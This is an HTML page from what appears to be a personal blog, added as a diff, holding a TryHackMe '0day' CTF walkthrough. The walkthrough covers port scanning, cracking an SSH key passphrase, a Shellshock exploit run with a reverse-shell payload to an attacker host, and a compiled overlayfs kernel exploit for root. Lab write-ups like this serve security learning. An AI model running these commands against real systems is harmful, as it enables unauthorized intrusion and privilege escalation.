@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title> :: MrFCode Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="0day - TryHackMe 07-08-2025
+CTF challenge solved.
+Starting with rustscan &amp; nmap Scanning the target to identify open ports $rustscan -a `cat ip.txt` PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack We have port 22/tcp and 80/tcp open. Scanning more in-depth on the target $nmap -sVC -T5 -Pn -oN nmap/deep -p22,80 10.201.64.14
+Nmap scan report for 10.201.64.14 Host is up (0.31s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA) | 2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA) | 256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA) |_ 256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: 0day Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Exploring the website on port 80/tcp (http) pages on the site (sitemap): 200 - 0B - /admin/ 200 - 0B - /admin/index.html 200 - 1KB - /backup/ 403 - 287B - /cgi-bin/ 200 - 13B - /cgi-bin/test.cgi 200 - 452B - /js/ 200 - 38B - /robots.txt 200 - 97B - /secret/ 200 - 0B - /uploads/ Found an SSH private key in /backup, and the password for the private key was cracked using ssh2john, John the Ripper, and the rockyou.txt wordlist. Password: letmein, but no valid user was found to log in with this id_rsa private key, so moving on to analyze the cgi-bin/test.cgi and test shellshock exploits.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/posts/ctf/thm/0day/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.min.775ac2af004d44c22a6d000fbd1d9af529642f5cef27399d0280d180af2c2e9b.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/menu.min.310d32205bdedd6f43144e3c3273c9deecd238eba5f9108db5ea96ca0cfbe377.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/post.min.ad50c7f4d00e7975918f37fc74c6029e1959a40d66fb5b2c6564a8715e985573.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.e9ab635cf918bc84b901eb65c0b2caa74c9544245e3647c1af5c129896ef276e.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.a0f34322ce6c615465a3a289723955f810b25fff2337dbefbe9003084ad43106.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="//localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="">
+<meta property="og:description" content="0day - TryHackMe 07-08-2025
+CTF challenge solved.
+Starting with rustscan &amp; nmap Scanning the target to identify open ports $rustscan -a `cat ip.txt` PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack We have port 22/tcp and 80/tcp open. Scanning more in-depth on the target $nmap -sVC -T5 -Pn -oN nmap/deep -p22,80 10.201.64.14
+Nmap scan report for 10.201.64.14 Host is up (0.31s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA) | 2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA) | 256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA) |_ 256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: 0day Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Exploring the website on port 80/tcp (http) pages on the site (sitemap): 200 - 0B - /admin/ 200 - 0B - /admin/index.html 200 - 1KB - /backup/ 403 - 287B - /cgi-bin/ 200 - 13B - /cgi-bin/test.cgi 200 - 452B - /js/ 200 - 38B - /robots.txt 200 - 97B - /secret/ 200 - 0B - /uploads/ Found an SSH private key in /backup, and the password for the private key was cracked using ssh2john, John the Ripper, and the rockyou.txt wordlist. Password: letmein, but no valid user was found to log in with this id_rsa private key, so moving on to analyze the cgi-bin/test.cgi and test shellshock exploits.
+" />
+<meta property="og:url" content="//localhost:1313/posts/ctf/thm/0day/" />
+<meta property="og:site_name" content="MrFCode Blog" />
+
+  <meta property="og:image" content="//localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    mrfcode blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/ctf/thm/0day/"></a>
+  </h1>
+  <div class="post-meta"></div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="0day---tryhackme"><a href="https://tryhackme.com/room/0day">0day</a> - TryHackMe<a href="#0day---tryhackme" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><code>07-08-2025</code></p>
+<p><a href="https://en.wikipedia.org/wiki/Capture_the_flag_%28cybersecurity%29">CTF</a> challenge solved.</p>
+<h2 id="starting-with-rustscan--nmap">Starting with rustscan &amp; nmap<a href="#starting-with-rustscan--nmap" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Scanning the target to identify open ports</li>
+</ul>
+<pre tabindex="0"><code>$rustscan -a `cat ip.txt`
+</code></pre><pre tabindex="0"><code>
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+</code></pre><ul>
+<li>We have port 22/tcp and 80/tcp open.</li>
+</ul>
+<h2 id="scanning-more-in-depth-on-the-target">Scanning more in-depth on the target<a href="#scanning-more-in-depth-on-the-target" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p><code>$nmap -sVC -T5 -Pn -oN nmap/deep -p22,80 10.201.64.14</code></p>
+<pre tabindex="0"><code>Nmap scan report for 10.201.64.14
+Host is up (0.31s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
+|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
+|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
+|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: 0day
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><h2 id="exploring-the-website-on-port-80tcp-http">Exploring the website on port 80/tcp (http)<a href="#exploring-the-website-on-port-80tcp-http" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>pages on the site (sitemap):</li>
+</ul>
+<pre tabindex="0"><code>
+200 -    0B  - /admin/
+200 -    0B  - /admin/index.html
+200 -    1KB - /backup/
+403 -  287B  - /cgi-bin/
+200 -   13B  - /cgi-bin/test.cgi
+200 -  452B  - /js/
+200 -   38B  - /robots.txt
+200 -   97B  - /secret/
+200 -    0B  - /uploads/
+</code></pre><p>Found an SSH private key in <code>/backup</code>, and the password for the private key was cracked using ssh2john, John the Ripper, and the rockyou.txt wordlist. Password: <code>letmein</code>, but no valid user was found to log in with this id_rsa private key, so moving on to analyze the <code>cgi-bin/test.cgi</code> and test shellshock exploits.</p>
+<p><code>$searchsploit shellschock</code></p>
+<pre tabindex="0"><code> Exploit Title                                                        |  Path
+---------------------------------------------------------------------- ---------------------------------
+Advantech Switch - &#39;Shellshock&#39; Bash Environment Variable Command Inj | cgi/remote/38849.rb
+Apache mod_cgi - &#39;Shellshock&#39; Remote Command Injection                | linux/remote/34900.py
+Bash - &#39;Shellshock&#39; Environment Variables Command Injection           | linux/remote/34766.php
+Bash CGI - &#39;Shellshock&#39; Remote Command Injection (Metasploit)         | cgi/webapps/34895.rb
+Cisco UCS Manager 2.1(1b) - Remote Command Injection (Shellshock)     | hardware/remote/39568.py
+dhclient 4.1 - Bash Environment Variable Command Injection (Shellshoc | linux/remote/36933.py
+GNU Bash - &#39;Shellshock&#39; Environment Variable Command Injection        | linux/remote/34765.txt
+IPFire - &#39;Shellshock&#39; Bash Environment Variable Command Injection (Me | cgi/remote/39918.rb
+NUUO NVRmini 2 3.0.8 - Remote Command Injection (Shellshock)          | cgi/webapps/40213.txt
+OpenVPN 2.2.29 - &#39;Shellshock&#39; Remote Command Injection                | linux/remote/34879.txt
+PHP &lt; 5.6.2 - &#39;Shellshock&#39; Safe Mode / disable_functions Bypass / Com | php/webapps/35146.txt
+Postfix SMTP 4.2.x &lt; 4.2.48 - &#39;Shellshock&#39; Remote Command Injection   | linux/remote/34896.py
+RedStar 3.0 Server - &#39;Shellshock&#39; &#39;BEAM&#39; / &#39;RSSMON&#39; Command Injection | linux/local/40938.py
+Sun Secure Global Desktop and Oracle Global Desktop 4.61.915 - Comman | cgi/webapps/39887.txt
+TrendMicro InterScan Web Security Virtual Appliance - &#39;Shellshock&#39; Re | hardware/remote/40619.py
+</code></pre><ul>
+<li>The &ldquo;Apache mod_cgi&rdquo; seems to be interesting so copied the exploit.</li>
+</ul>
+<p><code>$ searchsploit -m linux/remote/34900.py</code></p>
+<ul>
+<li>And run the script to see if we get a reverse shell.</li>
+</ul>
+<p><code>$./34900.py payload=reverse rhost=10.201.64.14 lhost=10.9.1.105 lport=4444</code></p>
+<pre tabindex="0"><code>[-] Trying exploit on : /cgi-bin/test.cgi
+[!] Successfully exploited
+[!] Incoming connection from 10.201.117.71
+10.201.117.71&gt; id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre><ul>
+<li>Successfully obtain the reverse shell; now it&rsquo;s time for privilege escalation.</li>
+</ul>
+<h2 id="privilege-escalation">Privilege escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Found the user ryan directory at &ldquo;/home/ryan&rdquo;, and inside that user directory found the user.txt flag.</p>
+<p>After looking a while, found the kernel version of the machine is vulnerable:
+<code>Linux Ubuntu 3.13.0-32-generic</code></p>
+<ul>
+<li>Searched for the version in searchsploit and found the exploit:</li>
+</ul>
+<p><code>$ searchsploit Linux ubuntu 3.13.0-32</code></p>
+<pre tabindex="0"><code>Exploit Title                                                        |  Path
+---------------------------------------------------------------------- ---------------------------------
+Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#39;overla | linux/local/37292.c
+</code></pre><ul>
+<li>Copied the exploit to the current working directory</li>
+</ul>
+<p><code>$ searchsploit -m linux/local/37292.c</code></p>
+<ul>
+<li>After compiling the file and running it, got root access:</li>
+</ul>
+<p><code>$ gcc 37292.c -o exploit &amp;&amp; ./exploit</code></p>
+<pre tabindex="0"><code>spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+</code></pre><p>Obtained access to root:</p>
+<pre tabindex="0"><code># whoami
+whoami
+root
+# ls /root
+ls /root
+root.txt
+</code></pre><p>Successfully owned the root and obtained the root.txt flag.</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="//localhost:1313/posts/blogsetup/" class="button inline prev">
+        &lt; [<span class="button__text"></span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="//localhost:1313/posts/ctf/thm/silverplatter/" class="button inline next">
+         [<span class="button__text"></span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
